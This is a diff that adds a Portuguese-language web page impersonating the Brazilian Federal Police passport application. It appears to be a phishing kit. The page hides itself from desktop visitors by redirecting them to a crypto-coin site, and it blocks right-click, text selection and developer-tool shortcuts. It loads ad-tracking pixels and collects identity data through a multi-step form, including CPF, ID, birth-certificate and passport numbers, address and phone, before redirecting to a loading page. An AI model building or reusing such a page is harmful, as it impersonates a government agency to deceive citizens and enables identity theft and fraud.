@@ -1,0 +1,726 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script async="" src="js/fbevents.js"></script><script type="text/javascript">
+        if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+          window.location.href = 'https://dogwifcoin.org/';
+        }
+     </script>
+     
+        <script type="text/javascript">
+        var message="Desculpe, o clique com o botão direito foi desativado.";
+        function clickIE() {if (document.all) {(message);return false;}}
+        function clickNS(e) {if
+        (document.layers||(document.getElementById&&!document.all)) {
+            if (e.which==2||e.which==3) {(message);return false;}}}
+        if (document.layers)
+        {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+        else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+        document.oncontextmenu=new Function("return false")
+        </script>
+        
+        <script>
+        document.onkeydown = function(e) {
+            if(event.keyCode == 123) {
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+                return false;
+            }
+        }
+        </script>
+        
+        <script>
+        function disableselect(e) {
+            return false;
+        }
+        
+        function reEnable() {
+            return true;
+        }
+        
+        document.onselectstart = new Function("return false");
+        
+        if (window.sidebar) {
+            document.onmousedown = disableselect;
+            document.onclick = reEnable;
+        }
+        </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitação de Passaporte</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .active-step {
+    border-bottom: 4px solid #286da8; /* Altere a cor para #286da8 */
+}
+
+    </style>
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1238265364044087');
+    fbq('track', 'PageView');
+    </script><script async="" defer="" src="js/pixel.js"></script></head>
+
+    <body class="bg-gray-100"><noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1238265364044087&ev=PageView&noscript=1"
+    /></noscript>
+    <script>
+        window.pixelId = "67243e70e257ad639df7c22c";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+      </script>
+
+    <header class="p-4 text-white" style="background-color: #286da8;">
+        <div class="flex items-center space-x-4">
+            <img src="images/logo%20pf.png" alt="Logo Polícia Federal" class="w-10 h-10">
+            <div>
+                <h1 class="text-xl font-semibold">Divisão de Passaporte</h1>
+                <p class="text-sm">Coordenação-Geral de Polícia de Imigração</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Mensagem em destaque vermelho -->
+    <div class="text-red-600 text-center py-2 font-bold">
+        Não utilize o botão voltar do seu navegador pois todos os dados serão perdidos. Utilize apenas os botões do próprio formulário.
+    </div>
+
+    <div class="max-w-4xl mx-auto mt-4 bg-white shadow-md rounded-lg p-6">
+        <div class="flex justify-between items-center">
+            <h2 class="text-xl font-bold" style="color: #286da8">Solicitação de passaporte</h2>
+            <p class="text-sm text-gray-500">(* Preenchimento Obrigatório)</p>
+        </div>
+
+        <div class="border-b border-gray-200 mb-4">
+            <nav class="flex flex-wrap justify-between text-blue-900">
+                <a href="#" class="pb-2 step-title active-step" id="step1-title">Dados Pessoais</a>
+                <a href="#" class="pb-2 step-title" id="step2-title">Documentos</a>
+                <a href="#" class="pb-2 step-title" id="step3-title">Dados complementares</a>
+                <a href="#" class="pb-2 step-title" id="step4-title">Revisar dados</a>
+            </nav>
+        </div>
+
+        <!-- Passo 1: Dados Pessoais -->
+        <form id="step1" class="space-y-4">
+            <div class="col-span-2">
+                <h3 class="text-blue-900 font-semibold">Dados Pessoais</h3>
+            </div>
+
+            <div>
+                <label class="block text-gray-700">Nome completo*:</label>
+                <input type="text" class="w-full p-2 border border-gray-300 rounded" name="Nome Completo">
+            </div>
+            <div>
+                <label class="block text-gray-700">Sexo*:</label>
+                <select class="w-full p-2 border border-gray-300 rounded" name="Sexo">
+                    <option>Selecione</option>
+                    <option>Masculino</option>
+                    <option>Feminino</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-gray-700">Filiação 1*:</label>
+                <input type="text" class="w-full p-2 border border-gray-300 rounded" name="Filiacao1">
+            </div>
+            <div>
+                <label class="block text-gray-700">Sexo:</label>
+                <select class="w-full p-2 border border-gray-300 rounded" name="SexoFiliacao1">
+                    <option>Selecione</option>
+                    <option>Masculino</option>
+                    <option>Feminino</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-gray-700">Filiação 2*:</label>
+                <input type="text" class="w-full p-2 border border-gray-300 rounded" name="Filiacao2">
+            </div>
+            <div>
+                <label class="block text-gray-700">Sexo:</label>
+                <select class="w-full p-2 border border-gray-300 rounded" name="SexoFiliacao2">
+                    <option>Selecione</option>
+                    <option>Masculino</option>
+                    <option>Feminino</option>
+                </select>
+            </div>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">Data de nascimento*:</label>
+                    <input type="date" class="w-full p-2 border border-gray-300 rounded" name="DataNascimento">
+                </div>
+                <div class="flex items-center">
+                    <label class="block text-gray-700 mr-4">Emancipado</label>
+                    <input type="checkbox" class="mr-6" name="Emancipado">
+                    <label class="block text-gray-700 mr-4">Adoção Internacional</label>
+                    <input type="checkbox" name="AdocaoInternacional">
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">Raça ou cor*:</label>
+                    <select class="w-full p-2 border border-gray-300 rounded" name="RacaCor">
+                        <option>Selecione</option>
+                        <option>Amarela</option>
+                        <option>Branca</option>
+                        <option>Indígena</option>
+                        <option>Parda</option>
+                        <option>Preta</option>
+                        <option>Outras</option>
+                        <option>Não desejo declarar</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-gray-700">Nacionalidade*:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" value="BRASIL" disabled="" name="Nacionalidade">
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">Estado civil*:</label>
+                    <select class="w-full p-2 border border-gray-300 rounded" name="EstadoCivil">
+                        <option>Selecione</option>
+                        <option>Solteiro(a)</option>
+                        <option>Casado(a)</option>
+                        <option>Divorciado(a)</option>
+                        <option>Viúvo(a)</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-gray-700">País de nascimento*:</label>
+                    <select class="w-full p-2 border border-gray-300 rounded" name="PaisNascimento">
+                        <option>Brasil</option>
+                        <option>Argentina</option>
+                        <option>Chile</option>
+                        <option>Estados Unidos</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">UF de nascimento*:</label>
+                    <select class="w-full p-2 border border-gray-300 rounded" name="UfNascimento">
+                        <option>Selecione</option>
+                        <option>AC</option>
+                        <option>AL</option>
+                        <option>AM</option>
+                        <option>AP</option>
+                        <option>BA</option>
+                        <option>CE</option>
+                        <option>DF</option>
+                        <option>ES</option>
+                        <option>GO</option>
+                        <option>MA</option>
+                        <option>MG</option>
+                        <option>MS</option>
+                        <option>MT</option>
+                        <option>PA</option>
+                        <option>PB</option>
+                        <option>PE</option>
+                        <option>PI</option>
+                        <option>PR</option>
+                        <option>RJ</option>
+                        <option>RN</option>
+                        <option>RO</option>
+                        <option>RR</option>
+                        <option>RS</option>
+                        <option>SC</option>
+                        <option>SE</option>
+                        <option>SP</option>
+                        <option>TO</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-gray-700">Cidade de nascimento*:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="CidadeNascimento">
+                </div>
+            </div>
+
+            <!-- Botões -->
+            <div class="flex justify-end space-x-4 mt-6">
+                <button type="submit" class="text-white px-4 py-2 rounded" style="background-color: #286da8;">Próximo</button>
+            </div>
+        </form>
+
+        <!-- Passo 2: Documentos -->
+        <form id="step2" class="space-y-4 hidden">
+            <div class="col-span-2">
+                <h3 class="text-blue-900 font-semibold">Documento de Identificação</h3>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">Número*:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="NumeroDoc">
+                </div>
+                <div>
+                    <label class="block text-gray-700">Órgão emissor*:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="OrgaoEmissor">
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">Data de emissão*:</label>
+                    <input type="date" class="w-full p-2 border border-gray-300 rounded" name="DataEmissao">
+                </div>
+                <div>
+                    <label class="block text-gray-700">UF de expedição*:</label>
+                    <select class="w-full p-2 border border-gray-300 rounded" name="UfExpedicao">
+                        <option value="">Selecione</option>
+                        <option value="AC">AC</option>
+                        <option value="AL">AL</option>
+                        <option value="AM">AM</option>
+                        <option value="AP">AP</option>
+                        <option value="BA">BA</option>
+                        <option value="CE">CE</option>
+                        <option value="DF">DF</option>
+                        <option value="ES">ES</option>
+                        <option value="GO">GO</option>
+                        <option value="MA">MA</option>
+                        <option value="MG">MG</option>
+                        <option value="MS">MS</option>
+                        <option value="MT">MT</option>
+                        <option value="PA">PA</option>
+                        <option value="PB">PB</option>
+                        <option value="PE">PE</option>
+                        <option value="PI">PI</option>
+                        <option value="PR">PR</option>
+                        <option value="RJ">RJ</option>
+                        <option value="RN">RN</option>
+                        <option value="RO">RO</option>
+                        <option value="RR">RR</option>
+                        <option value="RS">RS</option>
+                        <option value="SC">SC</option>
+                        <option value="SE">SE</option>
+                        <option value="SP">SP</option>
+                        <option value="TO">TO</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- CPF e Certidão -->
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">CPF*:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="Cpf">
+                </div>
+                <div class="col-span-2">
+                    <h3 class="text-blue-900 font-semibold">Certidão</h3>
+                </div>
+                <div>
+                    <label class="block text-gray-700">Certidão modelo novo?</label>
+                    <input type="checkbox" id="certidaoModeloNovo" name="CertidaoModeloNovo">
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">Matrícula:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="Matricula">
+                </div>
+                <div>
+                    <label class="block text-gray-700">Cartório:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="Cartorio">
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">Tipo:</label>
+                    <input type="text" id="tipo" class="w-full p-2 border border-gray-300 rounded" name="TipoCertidao">
+                </div>
+                <div>
+                    <label class="block text-gray-700">Folha:</label>
+                    <input type="text" id="folha" class="w-full p-2 border border-gray-300 rounded" name="Folha">
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">UF de expedição*:</label>
+                    <select class="w-full p-2 border border-gray-300 rounded" name="UfExpedicaoCertidao">
+                        <option value="">Selecione</option>
+                        <option value="AC">AC</option>
+                        <option value="AL">AL</option>
+                        <option value="AM">AM</option>
+                        <option value="AP">AP</option>
+                        <option value="BA">BA</option>
+                        <option value="CE">CE</option>
+                        <option value="DF">DF</option>
+                        <option value="ES">ES</option>
+                        <option value="GO">GO</option>
+                        <option value="MA">MA</option>
+                        <option value="MG">MG</option>
+                        <option value="MS">MS</option>
+                        <option value="MT">MT</option>
+                        <option value="PA">PA</option>
+                        <option value="PB">PB</option>
+                        <option value="PE">PE</option>
+                        <option value="PI">PI</option>
+                        <option value="PR">PR</option>
+                        <option value="RJ">RJ</option>
+                        <option value="RN">RN</option>
+                        <option value="RO">RO</option>
+                        <option value="RR">RR</option>
+                        <option value="RS">RS</option>
+                        <option value="SC">SC</option>
+                        <option value="SE">SE</option>
+                        <option value="SP">SP</option>
+                        <option value="TO">TO</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-gray-700">Cidade de expedição:</label>
+                    <input type="text" id="cidadeExpedicaoCertidao" class="w-full p-2 border border-gray-300 rounded" name="CidadeExpedicaoCertidao">
+                </div>
+            </div>
+
+            <!-- Passaporte Anterior -->
+            <div class="col-span-2">
+                <h3 class="text-blue-900 font-semibold">Passaporte Anterior</h3>
+            </div>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">Situação*:</label>
+                    <select class="w-full p-2 border border-gray-300 rounded" name="SituacaoPassaporte">
+                        <option>Selecione</option>
+                        <option>NUNCA TEVE PASSAPORTE COMUM, DE EMERGÊNCIA, PARA ESTRANGEIRO OU LAISSEZ-PASSER BRASILEIRO</option>
+                        <option>PASSAPORTE ANTERIOR VÁLIDO (OBRIGATÓRIA A APRESENTAÇÃO)</option>
+                        <option>EXTRAVIADO</option>
+                        <option>ESTÁ RETIDO/APREENDIDO PELA POLÍCIA FEDERAL</option>
+                        <option>ESTÁ RETIDO PELO MRE</option>
+                        <option>ROUBADO OU FURTADO</option>
+                        <option>PASSAPORTE ANTERIOR VENCIDO (RECOMENDA-SE APRESENTAÇÃO PARA CANCELAMENTO FÍSICO DO DOCUMENTO)</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-gray-700">Número*:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="NumeroPassaporte">
+                </div>
+                <div>
+                    <label class="block text-gray-700">Série:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="SeriePassaporte">
+                </div>
+            </div>
+
+            <p class="text-sm text-gray-500">(Exemplo: Para o passaporte CP999999 a série é CP e o número é 999999.)</p>
+
+            <!-- Botões -->
+            <div class="flex justify-between space-x-4">
+                <button type="button" class="bg-gray-500 text-white px-4 py-2 rounded">Anterior</button>
+                <button type="submit" class="bg-blue-900 text-white px-4 py-2 rounded">Próximo</button>
+            </div>
+        </form>
+
+        <!-- Passo 3: Dados Complementares -->
+        <form id="step3" class="hidden space-y-4">
+            <div class="col-span-2">
+                <h3 class="text-blue-900 font-semibold">Dados complementares</h3>
+            </div>
+
+            <!-- Lista de Profissões -->
+            <div>
+                <label class="block text-gray-700">Profissão*:</label>
+                <select class="w-full p-2 border border-gray-300 rounded" name="Profissao">
+                    <option>Selecione</option>
+                    <option>Administrador</option>
+                    <option>Advogado</option>
+                    <option>Agrônomo</option>
+                    <option>Arquiteto</option>
+                    <option>Assistente Social</option>
+                    <option>Astrônomo</option>
+                    <option>Ator</option>
+                    <option>Bancário</option>
+                    <option>Biólogo</option>
+                    <option>Biomédico</option>
+                    <option>Chefe de Cozinha</option>
+                    <option>Cirurgião</option>
+                    <option>Consultor de TI</option>
+                    <option>Dentista</option>
+                    <option>Designer Gráfico</option>
+                    <option>Desenvolvedor de Software</option>
+                    <option>Economista</option>
+                    <option>Enfermeiro</option>
+                    <option>Engenheiro Civil</option>
+                    <option>Engenheiro Eletricista</option>
+                    <option>Engenheiro Mecânico</option>
+                    <option>Farmacêutico</option>
+                    <option>Fisioterapeuta</option>
+                    <option>Geógrafo</option>
+                    <option>Geólogo</option>
+                    <option>Gestor Ambiental</option>
+                    <option>Jornalista</option>
+                    <option>Juiz</option>
+                    <option>Matemático</option>
+                    <option>Médico</option>
+                    <option>Meteorologista</option>
+                    <option>Músico</option>
+                    <option>Nutricionista</option>
+                    <option>Oceanógrafo</option>
+                    <option>Odontólogo</option>
+                    <option>Pedagogo</option>
+                    <option>Psicólogo</option>
+                    <option>Publicitário</option>
+                    <option>Químico</option>
+                    <option>Sociólogo</option>
+                    <option>Terapeuta Ocupacional</option>
+                    <option>Técnico de Enfermagem</option>
+                    <option>Técnico em Informática</option>
+                    <option>Veterinário</option>
+                    <option>Zootecnista</option>
+                    <option>OUTRAS OCUPAÇÕES NÃO ESPECIFICADAS ANTERIORMENTE</option>
+                </select>
+            </div>
+
+            <!-- E-mail -->
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">E-mail*:</label>
+                    <input type="email" class="w-full p-2 border border-gray-300 rounded" name="Email">
+                </div>
+                <div>
+                    <label class="block text-gray-700">Confirmação do E-mail*:</label>
+                    <input type="email" class="w-full p-2 border border-gray-300 rounded" name="ConfirmacaoEmail">
+                </div>
+            </div>
+
+            <!-- Endereço do requerente -->
+            <div class="col-span-2">
+                <h3 class="text-blue-900 font-semibold">Endereço do requerente</h3>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">País*:</label>
+                    <select class="w-full p-2 border border-gray-300 rounded" name="PaisRequerente">
+                        <option>Selecione</option>
+                        <option>Brasil</option>
+                        <option>Argentina</option>
+                        <option>Chile</option>
+                        <option>Estados Unidos</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-gray-700">CEP*:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="CEP">
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">Cidade*:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="CidadeRequerente">
+                </div>
+                <div>
+                    <label class="block text-gray-700">UF*:</label>
+                    <select class="w-full p-2 border border-gray-300 rounded" name="UfRequerente">
+                        <option>Selecione</option>
+                        <option>AC</option>
+                        <option>AL</option>
+                        <option>AM</option>
+                        <option>AP</option>
+                        <option>BA</option>
+                        <option>CE</option>
+                        <option>DF</option>
+                        <option>ES</option>
+                        <option>GO</option>
+                        <option>MA</option>
+                        <option>MG</option>
+                        <option>MS</option>
+                        <option>MT</option>
+                        <option>PA</option>
+                        <option>PB</option>
+                        <option>PE</option>
+                        <option>PI</option>
+                        <option>PR</option>
+                        <option>RJ</option>
+                        <option>RN</option>
+                        <option>RO</option>
+                        <option>RR</option>
+                        <option>RS</option>
+                        <option>SC</option>
+                        <option>SE</option>
+                        <option>SP</option>
+                        <option>TO</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">Logradouro*:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="Logradouro">
+                </div>
+                <div>
+                    <label class="block text-gray-700">Distrito/Bairro*:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="DistritoBairro">
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-gray-700">DDD:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="DDD">
+                </div>
+                <div>
+                    <label class="block text-gray-700">Telefone:</label>
+                    <input type="text" class="w-full p-2 border border-gray-300 rounded" name="Telefone">
+                </div>
+            </div>
+
+            <!-- Botões -->
+            <div class="flex justify-between space-x-4">
+                <button type="button" class="bg-gray-500 text-white px-4 py-2 rounded">Anterior</button>
+                <button type="submit" class="bg-blue-900 text-white px-4 py-2 rounded">Próximo</button>
+            </div>
+        </form>
+
+        <!-- Passo 4: Revisar Dados -->
+        <form id="step4" class="hidden space-y-4">
+            <div>
+                <h3 class="text-gray-700">Confira atentamente os dados abaixo:</h3>
+                <p>Nome completo: Fulano de Tal</p>
+                <p>Nacionalidade: BRASIL</p>
+                <p>Data de Nascimento: 01/01/1990</p>
+                <p>Sexo: Masculino</p>
+                <p>Profissão: Engenheiro</p>
+                <p>E-mail: fulano@email.com</p>
+            </div>
+
+            <!-- Adicionando o checkbox de confirmação -->
+            <div>
+                <label class="inline-flex items-center">
+                    <input type="checkbox" id="confirmacaoCheckbox" class="form-checkbox h-5 w-5 text-blue-600">
+                    <span class="ml-2 text-gray-700">Declaro que as informações acima estão corretas e que estou ciente de que qualquer erro nos dados implicará em atraso na emissão do meu documento de viagem.</span>
+                </label>
+            </div>
+
+            <!-- Botões -->
+            <div class="flex justify-between space-x-4">
+                <button type="button" class="bg-gray-500 text-white px-4 py-2 rounded">Anterior</button>
+                <button type="submit" id="submitButton" class="bg-blue-900 text-white px-4 py-2 rounded bg-blue-300 cursor-not-allowed" disabled="">Enviar</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // JavaScript para navegação entre os passos do formulário
+        const steps = ["step1", "step2", "step3", "step4"];
+        let currentStep = 0;
+    
+        function updateActiveStep() {
+            document.querySelectorAll(".step-title").forEach((step, index) => {
+                if (index === currentStep) {
+                    step.classList.add("active-step");
+                } else {
+                    step.classList.remove("active-step");
+                }
+            });
+        }
+    
+        document.querySelectorAll("button[type='submit']").forEach((button, index) => {
+            button.addEventListener("click", (event) => {
+                event.preventDefault();
+                if (index < steps.length - 1) {
+                    document.getElementById(steps[currentStep]).classList.add("hidden");
+                    currentStep++;
+                    document.getElementById(steps[currentStep]).classList.remove("hidden");
+                    updateActiveStep();
+    
+                    // Se for a etapa "Revisar dados", exibir as informações coletadas
+                    if (currentStep === 3) { // Step 4 é o índice 3 no array
+                        exibirDadosRevisao();
+                    }
+                }
+            });
+        });
+    
+        document.querySelectorAll("button[type='button']").forEach((button) => {
+            button.addEventListener("click", () => {
+                if (currentStep > 0) {
+                    document.getElementById(steps[currentStep]).classList.add("hidden");
+                    currentStep--;
+                    document.getElementById(steps[currentStep]).classList.remove("hidden");
+                    updateActiveStep();
+                }
+            });
+        });
+    
+        // Função para habilitar/desabilitar campos de certidão
+        document.getElementById("certidaoModeloNovo").addEventListener("change", function() {
+            const isChecked = this.checked;
+            document.getElementById("tipo").disabled = isChecked;
+            document.getElementById("folha").disabled = isChecked;
+            document.getElementById("cidadeExpedicaoCertidao").disabled = isChecked;
+        });
+    
+        // Função para coletar dados e mostrar na última etapa
+        const formData = {};
+    
+        // Coletar dados quando o usuário preencher os campos
+        document.querySelectorAll('input, select').forEach(field => {
+            field.addEventListener('input', function (event) {
+                formData[event.target.name] = event.target.value;
+            });
+        });
+    
+        // Função para exibir dados na etapa "Revisar dados"
+        function exibirDadosRevisao() {
+            document.querySelector("#step4 p:nth-of-type(1)").innerText = "Nome completo: " + (formData["Nome Completo"] || "Não preenchido");
+            document.querySelector("#step4 p:nth-of-type(2)").innerText = "Nacionalidade: " + (formData["Nacionalidade"] || "BRASIL");
+            document.querySelector("#step4 p:nth-of-type(3)").innerText = "Data de Nascimento: " + (formData["DataNascimento"] || "Não preenchido");
+            document.querySelector("#step4 p:nth-of-type(4)").innerText = "Sexo: " + (formData["Sexo"] || "Não preenchido");
+            document.querySelector("#step4 p:nth-of-type(5)").innerText = "Profissão: " + (formData["Profissao"] || "Não preenchido");
+            document.querySelector("#step4 p:nth-of-type(6)").innerText = "E-mail: " + (formData["Email"] || "Não preenchido");
+        }
+    
+        // Habilitar/desabilitar o botão de enviar com base na seleção do checkbox
+        const confirmacaoCheckbox = document.getElementById("confirmacaoCheckbox");
+        const submitButton = document.getElementById("submitButton");
+    
+        // Inicialmente, o botão é desabilitado e tem um azul mais claro
+        submitButton.classList.add("bg-blue-300", "cursor-not-allowed");
+        submitButton.disabled = true;
+    
+        confirmacaoCheckbox.addEventListener("change", function() {
+            if (this.checked) {
+                submitButton.disabled = false;
+                submitButton.classList.remove("bg-blue-300", "cursor-not-allowed");
+                submitButton.classList.add("bg-blue-900", "cursor-pointer");
+            } else {
+                submitButton.disabled = true;
+                submitButton.classList.remove("bg-blue-900", "cursor-pointer");
+                submitButton.classList.add("bg-blue-300", "cursor-not-allowed");
+            }
+        });
+    
+       // Função para redirecionamento à página de carregamento
+       submitButton.addEventListener("click", function() {
+            if (confirmacaoCheckbox.checked) {
+                window.location.href = "/passaporte/loading.html"; // Redireciona para a tela de carregamento
+            }
+        });
+    
+        updateActiveStep();  // Atualiza o passo ativo inicialmente
+    </script>
+
+
+</body></html>
